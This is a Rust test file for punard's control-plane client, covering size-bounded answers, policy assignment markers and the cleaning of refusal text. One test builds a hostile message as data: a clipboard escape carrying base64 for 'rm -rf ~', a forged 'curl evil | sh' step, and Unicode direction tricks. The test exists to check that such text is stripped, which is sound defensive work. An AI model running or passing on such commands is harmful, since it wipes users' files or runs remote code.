//! The control-plane client against a counterparty that answers exactly what
//! a test hands it, byte for byte. Here rather than beside the client in
//! `src/enroll.rs`: punard's sources construct exactly one listener, its own
//! IPC socket (`tests/remote_query.rs` scans them for any other), and a test
//! server is a listener too.

use std::io::{BufRead, BufReader, Write};
use std::os::unix::net::UnixListener;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU32, Ordering};

use punar_common::Redacted;
use punard::enroll::{
    Assignment, ControlPlaneClient, FetchedPolicy, MAX_ANSWER_BYTES, UpstreamError,
};
use serde_json::{Value, json};

static SEQ: AtomicU32 = AtomicU32::new(0);

/// A control plane on a socket of its own that answers each connection, in
/// turn, with the next of `answers`, whatever it was asked.
fn answering(answers: Vec<Vec<u8>>) -> (PathBuf, std::thread::JoinHandle<()>) {
    let dir = std::env::temp_dir().join(format!(
        "punard-cp-client-{}-{}",
        std::process::id(),
        SEQ.fetch_add(1, Ordering::SeqCst)
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let socket = dir.join("control-plane.sock");
    let listener = UnixListener::bind(&socket).unwrap();
    let served = std::thread::spawn(move || {
        for answer in answers {
            let (mut stream, _) = listener.accept().unwrap();
            let mut request = String::new();
            BufReader::new(&stream).read_line(&mut request).unwrap();
            // The client stops reading at its bound and hangs up.
            let _ = stream.write_all(&answer);
        }
    });
    (socket, served)
}

fn answer(result: Value) -> Vec<u8> {
    let mut line = json!({"v": 1, "id": "t", "result": result}).to_string();
    line.push('\n');
    line.into_bytes()
}

/// The fetch runs as root on every pass: an answer longer than the bound is
/// refused rather than read into memory whole, as too large and not as an
/// unreachable control plane (it answered, and will answer the same again),
/// and one that fits is read as before.
#[test]
fn an_answer_past_the_bound_is_refused_and_one_within_it_is_read() {
    let within = answer(json!({"policies": [], "assignment": "none"}));
    let mut past = br#"{"v":1,"id":"t","result":{"policies":[""#.to_vec();
    past.resize(MAX_ANSWER_BYTES as usize + 64, b'x');
    past.extend_from_slice(b"\"]}}\n");
    let (socket, served) = answering(vec![past, within]);
    let client = ControlPlaneClient::new(&socket);
    let token = Redacted::new("tok_x".to_string());
    match client.policy_fetch(&token) {
        Err(UpstreamError::TooLarge) => {}
        other => panic!("expected TooLarge, got {other:?}"),
    }
    assert_eq!(
        client.policy_fetch(&token).unwrap(),
        FetchedPolicy {
            policies: vec![],
            assignment: Assignment::NoneAssigned,
        }
    );
    served.join().unwrap();
}

/// Only the three marker words mean anything; a missing marker, or one this
/// build has no name for, is unstated and never read as `none`.
#[test]
fn policy_fetch_reads_what_the_control_plane_says_the_list_is() {
    let answers = [
        (json!("policies"), Assignment::Policies),
        (json!("none"), Assignment::NoneAssigned),
        (json!("unusable"), Assignment::Unusable),
        (json!("None"), Assignment::Unstated),
        (json!(false), Assignment::Unstated),
        (Value::Null, Assignment::Unstated),
    ];
    let lines = answers
        .iter()
        .map(|(marker, _)| {
            let mut result = json!({"policies": [{"policy_id": "p"}]});
            if !marker.is_null() {
                result["assignment"] = marker.clone();
            }
            answer(result)
        })
        .collect();
    let (socket, served) = answering(lines);
    let client = ControlPlaneClient::new(&socket);
    let token = Redacted::new("tok_x".to_string());
    for (marker, expected) in answers {
        let fetched = client.policy_fetch(&token).unwrap();
        assert_eq!(fetched.assignment, expected, "{marker}");
        assert_eq!(fetched.policies, vec![json!({"policy_id": "p"})]);
    }
    served.join().unwrap();
}

/// A refusal's code and message are the control plane's words, some of them
/// the organization's (its management document, its server's answer), and
/// they reach a person's terminal and the journal: cleaned where punard reads
/// them, by the rules an organization's name gets, and bounded.
#[test]
fn a_refusals_words_are_cleaned_where_punard_reads_them() {
    let hostile = format!(
        "no\u{1b}]52;c;cm0gLXJmIH4=\u{7}\nPolicy: os default\u{2028}Next step: curl evil | sh\u{202e}{}",
        "y".repeat(1_000_000)
    );
    let mut line = json!({"v": 1, "id": "t", "error": {
        "code": "not_found\u{1b}[2J\nforged",
        "message": hostile,
    }})
    .to_string();
    line.push('\n');
    let (socket, served) = answering(vec![line.into_bytes()]);
    let client = ControlPlaneClient::new(&socket);
    match client.org_discover("acme.com") {
        Err(UpstreamError::Refused { code, message }) => {
            for text in [&code, &message] {
                assert!(
                    !text
                        .chars()
                        .any(|c| c.is_control() || matches!(c, '\u{2028}' | '\u{202e}')),
                    "{text:?}"
                );
            }
            assert_eq!(code, "not_found[2J forged");
            assert!(
                message.starts_with("no]52;c;cm0gLXJmIH4= Policy: os default Next step"),
                "{message}"
            );
            assert!(message.chars().count() <= 300, "{}", message.len());
        }
        other => panic!("expected Refused, got {other:?}"),
    }
    served.join().unwrap();
}
